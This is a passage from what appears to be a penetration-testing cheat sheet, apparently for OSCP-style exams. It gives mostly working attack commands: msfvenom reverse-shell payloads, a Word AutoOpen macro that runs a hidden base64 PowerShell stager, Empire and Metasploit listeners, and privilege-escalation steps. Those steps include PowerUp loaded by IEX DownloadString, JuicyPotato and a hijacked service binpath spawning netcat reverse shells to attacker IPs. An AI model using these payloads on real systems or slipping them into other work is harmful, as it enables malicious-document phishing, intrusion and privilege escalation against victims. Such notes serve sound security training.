</code></pre></div><h3 id="fully-interactive-shell"><a href="#fully-interactive-shell" class="header-anchor">#</a> Fully interactive shell</h3> <p>First, run the semi-interactive shell python command, then background the current shell process, run <code>stty raw -echo</code> in the terminal which will pass keyboard shortcuts through, then run <code>fg</code> to bring netcat back.</p> <h2 id="msfvenom"><a href="#msfvenom" class="header-anchor">#</a> Msfvenom</h2> <h3 id="windows-exe-staged-payload-needs-metasploit-to-catch-allowed-on-exam"><a href="#windows-exe-staged-payload-needs-metasploit-to-catch-allowed-on-exam" class="header-anchor">#</a> Windows exe staged_payload (needs metasploit to catch, <strong>allowed on exam</strong>)</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.11</span>.0.4 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">5555</span> <span class="token parameter variable">-f</span> exe <span class="token operator">&gt;</span> binary.exe
</code></pre></div><h3 id="powershell-2"><a href="#powershell-2" class="header-anchor">#</a> Powershell</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.119.194 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">5555</span> <span class="token parameter variable">-f</span> powershell
</code></pre></div><h3 id="combining-payloads"><a href="#combining-payloads" class="header-anchor">#</a> Combining payloads</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>nasm <span class="token parameter variable">-f</span> bin eternalblue_x64_kshellcode.asm <span class="token parameter variable">-o</span> sc_x64_kernel.bin
msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token parameter variable">-f</span> raw <span class="token parameter variable">-o</span> sc_x64_msf.bin <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.254.142 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span>
<span class="token function">cat</span> sc_x64_kernel.bin sc_x64_msf.bin <span class="token operator">&gt;</span> sc_x64.bin
</code></pre></div><h2 id="windows-tips-tricks"><a href="#windows-tips-tricks" class="header-anchor">#</a> Windows tips &amp; tricks</h2> <h3 id="changing-execution-policy"><a href="#changing-execution-policy" class="header-anchor">#</a> Changing execution policy</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>Set-ExecutionPolicy <span class="token parameter variable">-ExecutionPolicy</span> Unrestricted <span class="token parameter variable">-Scope</span> CurrentUser
Get-ExecutionPolicy <span class="token parameter variable">-Scope</span> CurrentUser
</code></pre></div><h2 id="microsoft-word-macro-payload"><a href="#microsoft-word-macro-payload" class="header-anchor">#</a> Microsoft-word macro payload</h2> <p>First create an <code>evil.hta</code> file like so:</p> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token comment"># recommended</span>
msfvenom <span class="token parameter variable">-p</span> windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.119.194 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">80</span> <span class="token parameter variable">-f</span> vba-psh <span class="token operator">&gt;</span> payload.txt
<span class="token comment"># or</span>
<span class="token function">sudo</span> msfvenom <span class="token parameter variable">-p</span> windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.11</span>.0.4 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> hta-psh <span class="token parameter variable">-o</span> /var/www/html/evil.hta 
</code></pre></div><p>Next create a new macro and copy-paste the file into the macro</p> <p>Finally create a word macro and past the shell code in like so:</p> <div class="language-sh extra-class"><pre class="language-sh"><code>Sub AutoOpen<span class="token punctuation">(</span><span class="token punctuation">)</span>
    MyMacro
End Sub

Sub Document_Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
    MyMacro
End Sub

Sub MyMacro<span class="token punctuation">(</span><span class="token punctuation">)</span>
    Dim Str As String
    Str <span class="token operator">=</span> <span class="token string">&quot;powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ&quot;</span>
    Str <span class="token operator">=</span> Str + <span class="token string">&quot;QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB&quot;</span>
    Str <span class="token operator">=</span> Str + <span class="token string">&quot;TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A&quot;</span>
    Str <span class="token operator">=</span> Str + <span class="token string">&quot;EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg&quot;</span>
    Str <span class="token operator">=</span> Str + <span class="token string">&quot;ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY&quot;</span>
    Str <span class="token operator">=</span> Str + <span class="token string">&quot;gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB&quot;</span>
    <span class="token punctuation">..</span>.
    Str <span class="token operator">=</span> Str + <span class="token string">&quot;AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac&quot;</span>
    Str <span class="token operator">=</span> Str + <span class="token string">&quot;AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB&quot;</span>
    Str <span class="token operator">=</span> Str + <span class="token string">&quot;lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA&quot;</span>
    Str <span class="token operator">=</span> Str + <span class="token string">&quot;FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA&quot;</span>   
    Str <span class="token operator">=</span> Str + <span class="token string">&quot;AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK&quot;</span>
    Str <span class="token operator">=</span> Str + <span class="token string">&quot;QA=&quot;</span> 
    
    CreateObject<span class="token punctuation">(</span><span class="token string">&quot;Wscript.Shell&quot;</span><span class="token punctuation">)</span>.Run Str 
End Sub
</code></pre></div><p>Now save the file as either a <code>docm</code> file type or a <code>doc</code> (older) file type</p> <p><strong>ALTERNATIVELY</strong></p> <p>we can use powershell empire</p> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token punctuation">(</span>Empire<span class="token punctuation">)</span> <span class="token operator">&gt;</span> listeners
<span class="token punctuation">(</span>Empire: listeners<span class="token punctuation">)</span> <span class="token operator">&gt;</span> uselistener http
<span class="token punctuation">(</span>Empire: listeners/http<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> Host <span class="token number">192.168</span>.119.194
<span class="token punctuation">(</span>Empire: listeners/http<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> Name exploit
<span class="token punctuation">(</span>Empire: listeners/http<span class="token punctuation">)</span> <span class="token operator">&gt;</span> execute
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting listener <span class="token string">'exploit'</span>
 * Serving Flask app <span class="token string">&quot;http&quot;</span> <span class="token punctuation">(</span>lazy loading<span class="token punctuation">)</span>
 * Environment: production
   WARNING: This is a development server. Do not use it <span class="token keyword">in</span> a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Listener successfully started<span class="token operator">!</span>
<span class="token punctuation">(</span>Empire: listeners/http<span class="token punctuation">)</span> <span class="token operator">&gt;</span> back
<span class="token punctuation">(</span>Empire: listeners<span class="token punctuation">)</span> <span class="token operator">&gt;</span> usestager windows/macro
<span class="token punctuation">(</span>Empire: stager/windows/macro<span class="token punctuation">)</span> <span class="token operator">&gt;</span> listeners

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Active listeners:

  Name              Module          Host                                 Delay/Jitter   KillDate
  ----              ------          ----                                 ------------   --------
  exploit           http            http://192.168.119.194:80            <span class="token number">5</span>/0.0                  

<span class="token punctuation">(</span>Empire: stager/windows/macro<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> Listener exploit
<span class="token punctuation">(</span>Empire: stager/windows/macro<span class="token punctuation">)</span> <span class="token operator">&gt;</span> execute

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stager output written out to: /tmp/macro
</code></pre></div><p>Check if macro was embedded using `olevba word_macro.doc from <a href="https://github.com/decalage2/oletools" target="_blank" rel="noopener noreferrer">oletools<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h2 id="metasploit-framework"><a href="#metasploit-framework" class="header-anchor">#</a> Metasploit framework</h2> <h3 id="windows-reverse-meterpreter-shell"><a href="#windows-reverse-meterpreter-shell" class="header-anchor">#</a> Windows reverse meterpreter shell</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>msfconsole <span class="token parameter variable">-x</span> <span class="token string">&quot;use exploit/multi/handler&quot;</span><span class="token punctuation">;</span> <span class="token builtin class-name">set</span> RHOST <span class="token number">192.168</span>.194.10<span class="token punctuation">;</span> <span class="token builtin class-name">set</span> PAYLOAD windows/meterpreter/reverse_tcp<span class="token punctuation">;</span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.119.194<span class="token punctuation">;</span> <span class="token builtin class-name">set</span> LPORT <span class="token number">5555</span><span class="token punctuation">;</span>
</code></pre></div><p>or</p> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token function">sudo</span> msfconsole
<span class="token operator">&gt;</span> use exploit/multi/handler
<span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> PAYLOAD windows/meterpreter/reverse_tcp
<span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.119.194
<span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> LPORT <span class="token number">5555</span>
<span class="token operator">&gt;</span> run
</code></pre></div><h2 id="device-enumeration"><a href="#device-enumeration" class="header-anchor">#</a> Device enumeration</h2> <h3 id="useful-commands-for-windows-clients"><a href="#useful-commands-for-windows-clients" class="header-anchor">#</a> Useful commands for windows clients:</h3> <ul><li>View user info: <code>net user</code></li> <li>View system info: <code>systeminfo</code></li> <li>View routing information: <code>route print</code></li> <li>View running services: <code>Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}</code></li> <li>View active network connections: <code>netstat -ano</code></li> <li>View current firewall profile: <code>netsh advfirewall show currentprofile</code> <ul><li>View all firewall rules: <code>netsh advfirewall show rule name=all</code></li></ul></li> <li>View scheduled tasks: <code>schtasks /query /fo LIST /v</code></li> <li>View all installed application with version: <code>wmic product get name, version, vendor</code> <ul><li>View system wide updates: <code>wmic qfe Caption, Description, HotFixID, InstalledOn</code></li></ul></li> <li>View any file that can be modified by anyone using <strong>powershell</strong>: <code>Get-ChildItem &quot;C:\Program Files&quot; -Recurse | Get-ACL | ?{$_.AccessToString -match &quot;Everyone\sAllow\s\sModify&quot;}</code></li> <li>List all drives that are mounted and non-mounted: <code>mountvol</code></li> <li>Gather kernel information in <strong>powershell</strong>: <code>driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Node', Path</code></li> <li>Gather driver versions ie. vmware: <code>Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like &quot;*Vmware*&quot;}</code></li> <li>Checking if we can run any windows installer with elevated priviledges:
<ul><li><code>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</code></li> <li><code>reg query HKEY_CURRENT_MACHINE\Software\Policies\Microsoft\Windows\Installer</code></li></ul></li></ul> <h3 id="for-linux-client-commands-that-can-be-used"><a href="#for-linux-client-commands-that-can-be-used" class="header-anchor">#</a> For linux client, commands that can be used:</h3> <ul><li>View all processes: <code>ps axu</code></li> <li>Check all TCP/IP configurations: <code>ip a</code></li> <li>Display network routing table: <code>/sbin/route</code></li> <li>Display active network connections: <code>ss -anp</code></li> <li>View scheduled tasks: <code>ls -lah /etc/cron*</code> <ul><li>Crontab: <code>cat /etc/crontab</code></li></ul></li> <li>Listing installed packages: <code>dpkg -l</code></li> <li>Find all directories writable by current user: <code>find / -writable -type d 2&gt;/dev/null</code></li> <li>List all mounted file systems: <code>mount</code> <ul><li>static file system: <code>cat /etc/fstab</code></li> <li>All available disks: <code>/bin/lsblk</code></li></ul></li> <li>Loaded kernel modules: <code>lsmod</code> <ul><li>Find out more about module: <code>/sbin/modinfo &lt;module_name&gt;</code></li></ul></li> <li>Find any binaries that can be run as root: <code>find / -perm -u=s -type f 2&gt;/dev/null</code></li></ul> <h2 id="privilege-escalation-priv-esc"><a href="#privilege-escalation-priv-esc" class="header-anchor">#</a> Privilege escalation (Priv esc)</h2> <h3 id="windows"><a href="#windows" class="header-anchor">#</a> Windows</h3> <ul><li>Starting powershell in high-integrity mode: <code>powershell Start-Process cmd.exe -Verb runAs</code></li> <li>A lot of windows binaries can be found at <code>/usr/share/windows-binaries/</code> for kali linux</li></ul> <h4 id="sherlock"><a href="#sherlock" class="header-anchor">#</a> Sherlock</h4> <ul><li>Can use sherlock to find priv esc possiblities</li></ul> <h4 id="finding-system-info"><a href="#finding-system-info" class="header-anchor">#</a> Finding system info</h4> <div class="language-sh extra-class"><pre class="language-sh"><code>systeminfo <span class="token operator">|</span> findstr /B /C:<span class="token string">&quot;OS Name&quot;</span> /C:<span class="token string">&quot;OS Version&quot;</span>
<span class="token function">hostname</span>
<span class="token builtin class-name">echo</span> %username%
net <span class="token function">users</span>
</code></pre></div><h4 id="powerup"><a href="#powerup" class="header-anchor">#</a> Powerup</h4> <div class="language-powershell extra-class"><pre class="language-powershell"><code>powershell <span class="token operator">-</span>Version 2 <span class="token operator">-</span>nop <span class="token operator">-</span>exec bypass <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'http://192.168.119.194/PowerUp.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">Invoke-AllChecks</span>
<span class="token comment"># Powerup original url: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</span>
</code></pre></div><h4 id="windows-exploit-suggester"><a href="#windows-exploit-suggester" class="header-anchor">#</a> Windows Exploit Suggester</h4> <div class="language-sh extra-class"><pre class="language-sh"><code>windows-exploit-suggester <span class="token parameter variable">--database</span> <span class="token number">2020</span>-05-20-mssb.xls <span class="token parameter variable">--systeminfo</span> systeminfo.txt
</code></pre></div><h4 id="juicypotato"><a href="#juicypotato" class="header-anchor">#</a> JuicyPotato</h4> <p>RottenPotatoNG and its variants leverages the privilege escalation chain based on BITS service having the MiTM listener on <code>127.0.0.1:6666</code> and when you have SeImpersonate or SeAssignPrimaryToken privileges. During a Windows build review we found a setup where BITS was intentionally disabled and port <code>6666</code> was taken. Neds to have <code>SeImpersonatePrivilege</code> enabled:</p> <div class="language-powershell extra-class"><pre class="language-powershell"><code>c:\Users\Public\Documents&gt;whoami <span class="token operator">/</span>priv
PRIVILEGES INFORMATION
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a <span class="token keyword">process</span> level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="token keyword">for</span> a <span class="token keyword">process</span>        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a <span class="token keyword">process</span> working <span class="token function">set</span>            Disabled
</code></pre></div><ul><li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato" target="_blank" rel="noopener noreferrer">Juicy-Potato-description<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://github.com/ohpe/juicy-potato/releases" target="_blank" rel="noopener noreferrer">Juicy-Potato release<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul> <h5 id="usage"><a href="#usage" class="header-anchor">#</a> Usage</h5> <p>We will need <code>CLSID</code>'s to use for the scrip. Either by running the script <a href="https://ohpe.it/juicy-potato/CLSID/GetCLSID.ps1" target="_blank" rel="noopener noreferrer">Get-CLSID.ps1<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> or by finding the corresponding one inside this <a href="https://ohpe.it/juicy-potato/CLSID/" target="_blank" rel="noopener noreferrer">list<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> and use psexec to change to a service account: <a href="https://download.sysinternals.com/files/PSTools.zip" target="_blank" rel="noopener noreferrer">pstools<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <div class="language-powershell extra-class"><pre class="language-powershell"><code>JuicyPotato <span class="token operator">-</span>l 1337 <span class="token operator">-</span>p c:\windows\system32\cmd<span class="token punctuation">.</span>exe <span class="token operator">-</span>a <span class="token string">&quot;/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443&quot;</span> <span class="token operator">-</span>t <span class="token operator">*</span>
<span class="token comment"># or </span>
juicypotato<span class="token punctuation">.</span>exe <span class="token operator">-</span>l 1337 <span class="token operator">-</span>p c:\windows\system32\cmd<span class="token punctuation">.</span>exe <span class="token operator">-</span>t <span class="token operator">*</span> <span class="token operator">-</span>c <span class="token punctuation">{</span>e60687f7-01a1-40aa-86ac-db1cbf673334<span class="token punctuation">}</span>
</code></pre></div><h4 id="windows-services"><a href="#windows-services" class="header-anchor">#</a> Windows Services</h4> <h5 id="sc-exe"><a href="#sc-exe" class="header-anchor">#</a> sc.exe</h5> <div class="language-sh extra-class"><pre class="language-sh"><code>sc query <span class="token assign-left variable">state</span><span class="token operator">=</span> all <span class="token operator">|</span> findstr <span class="token string">&quot;SERVICE_NAME:&quot;</span> <span class="token operator">&gt;&gt;</span> Servicenames.txt

FOR /F %i <span class="token keyword">in</span> <span class="token punctuation">(</span>Servicenames.txt<span class="token punctuation">)</span> DO <span class="token builtin class-name">echo</span> %i
<span class="token builtin class-name">type</span> Servicenames.txt

FOR /F <span class="token string">&quot;tokens=2 delims= &quot;</span> %i <span class="token keyword">in</span> <span class="token punctuation">(</span>Servicenames.txt<span class="token punctuation">)</span> DO @echo %i <span class="token operator">&gt;&gt;</span> services.txt

FOR /F %i <span class="token keyword">in</span> <span class="token punctuation">(</span>services.txt<span class="token punctuation">)</span> DO @sc qc %i <span class="token operator">|</span> findstr <span class="token string">&quot;BINARY_PATH_NAME&quot;</span> <span class="token operator">&gt;&gt;</span> path.txt
</code></pre></div><p><code>cacls &quot;C:\path\to\file.exe&quot;</code></p> <p>we want to look for <code>BUITIN/users:(F)</code> or when our user/usergroup has <code>(F)</code> or <code>(C)</code> rights.</p> <p>then we can just replace that exe with our own malicious exe and rerun the service:</p> <p><code>net stop [service name] &amp;&amp; net start [service name].</code></p> <h6 id="example"><a href="#example" class="header-anchor">#</a> Example</h6> <div class="language-sh extra-class"><pre class="language-sh"><code>sc config upnphost <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">&quot;C:\Inetpub<span class="token entity" title="\n">\n</span>c.exe 192.168.119.194 443 -e c:\Windows\system32<span class="token entity" title="\c">\c</span>md.exe&quot;</span>
sc config upnphost <span class="token assign-left variable">obj</span><span class="token operator">=</span> <span class="token string">&quot;.\LocalSystem&quot;</span> <span class="token assign-left variable">password</span><span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
sc config upnphost <span class="token assign-left variable">depend</span><span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
sc qc upnphost
net start upnphost
</code></pre></div><h5 id="microsoft-systems-internal-suite"><a href="#microsoft-systems-internal-suite" class="header-anchor">#</a> Microsoft systems internal suite</h5> <p>This system's internal suite: <a href="https://download.sysinternals.com/files/SysinternalsSuite.zip" target="_blank" rel="noopener noreferrer">Link<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> contains a variety of scripts that can be used to check user privileges.</p> <p>Now we can use the following:</p> <div class="language-sh extra-class"><pre class="language-sh"><code>C:<span class="token punctuation">\</span>Inetpub<span class="token operator">&gt;</span>accesschk.exe <span class="token parameter variable">-uwcqv</span> <span class="token string">&quot;Authenticated Users&quot;</span> *
C:<span class="token punctuation">\</span><span class="token operator">&gt;</span> accesschk.exe <span class="token parameter variable">-uwcqv</span> <span class="token string">&quot;Authenticated Users&quot;</span> *
C:<span class="token punctuation">\</span><span class="token operator">&gt;</span> accesschk.exe <span class="token parameter variable">-ucqv</span> SSDPSRV
C:<span class="token punctuation">\</span><span class="token operator">&gt;</span> accesschk.exe <span class="token parameter variable">-ucqv</span> upnphost
</code></pre></div><p>This guide is useful: https://www.fuzzysecurity.com/tutorials/16.html</p> <h4 id="winpeas"><a href="#winpeas" class="header-anchor">#</a> WinPEAS</h4> <p>Windows privelege escalation checker <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe" target="_blank" rel="noopener noreferrer">Link<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h3 id="linux"><a href="#linux" class="header-anchor">#</a> Linux</h3> <p>Can use linux priv esc checker.</p> <h2 id="port-forwarding"><a href="#port-forwarding" class="header-anchor">#</a> Port forwarding</h2> <h3 id="remote-port-forwarding"><a href="#remote-port-forwarding" class="header-anchor">#</a> Remote port forwarding</h3> <p>Traffic sent to victim port will be sent to our port instead. This can be used to bypass firewalls.</p> <p>First, on victim machine:</p> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token function">ssh</span> <span class="token parameter variable">-N</span> <span class="token parameter variable">-R</span> <span class="token operator">&lt;</span>our_ip<span class="token operator">&gt;</span>:<span class="token operator">&lt;</span>our_port_number<span class="token operator">&gt;</span>:127.0.0.1:<span class="token operator">&lt;</span>port_to_forward<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>our_username<span class="token operator">&gt;</span>@<span class="token operator">&lt;</span>our_ip<span class="token operator">&gt;</span>
</code></pre></div><p>Then on our machine to verify:</p> <div class="language-sh extra-class"><pre class="language-sh"><code>ss <span class="token parameter variable">-antp</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">&quot;&lt;out_port_number&gt;&quot;</span>
</code></pre></div><h2 id="active-directory"><a href="#active-directory" class="header-anchor">#</a> Active Directory</h2> <div class="language-powershell extra-class"><pre class="language-powershell"><code><span class="token namespace">[System.DirecrotyServices.ActiveDirectory.Domain]</span>::GetCurrentDomain<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="get-all-service-principal-names-spn-s"><a href="#get-all-service-principal-names-spn-s" class="header-anchor">#</a> Get all Service Principal Names (SPN's)</h3> <div class="language-powershell extra-class"><pre class="language-powershell"><code>cls
<span class="token variable">$search</span> = <span class="token function">New-Object</span> DirectoryServices<span class="token punctuation">.</span>DirectorySearcher<span class="token punctuation">(</span><span class="token namespace">[ADSI]</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span>
<span class="token variable">$search</span><span class="token punctuation">.</span><span class="token keyword">filter</span> = <span class="token string">&quot;(servicePrincipalName=*)&quot;</span>

<span class="token comment">## You can use this to filter for OU's:</span>
<span class="token comment">## $results = $search.Findall() | ?{ $_.path -like '*OU=whatever,DC=whatever,DC=whatever*' }</span>
<span class="token variable">$results</span> = <span class="token variable">$search</span><span class="token punctuation">.</span>Findall<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span> <span class="token variable">$result</span> in <span class="token variable">$results</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token variable">$userEntry</span> = <span class="token variable">$result</span><span class="token punctuation">.</span>GetDirectoryEntry<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token function">Write-host</span> <span class="token string">&quot;Object Name = &quot;</span> <span class="token variable">$userEntry</span><span class="token punctuation">.</span>name <span class="token operator">-</span>backgroundcolor <span class="token string">&quot;yellow&quot;</span> <span class="token operator">-</span>foregroundcolor <span class="token string">&quot;black&quot;</span>
	<span class="token function">Write-host</span> <span class="token string">&quot;DN      =      &quot;</span>  <span class="token variable">$userEntry</span><span class="token punctuation">.</span>distinguishedName
	<span class="token function">Write-host</span> <span class="token string">&quot;Object Cat. = &quot;</span>  <span class="token variable">$userEntry</span><span class="token punctuation">.</span>objectCategory
	<span class="token function">Write-host</span> <span class="token string">&quot;servicePrincipalNames&quot;</span>

	<span class="token variable">$i</span>=1
	<span class="token keyword">foreach</span><span class="token punctuation">(</span> <span class="token variable">$SPN</span> in <span class="token variable">$userEntry</span><span class="token punctuation">.</span>servicePrincipalName <span class="token punctuation">)</span> <span class="token punctuation">{</span>
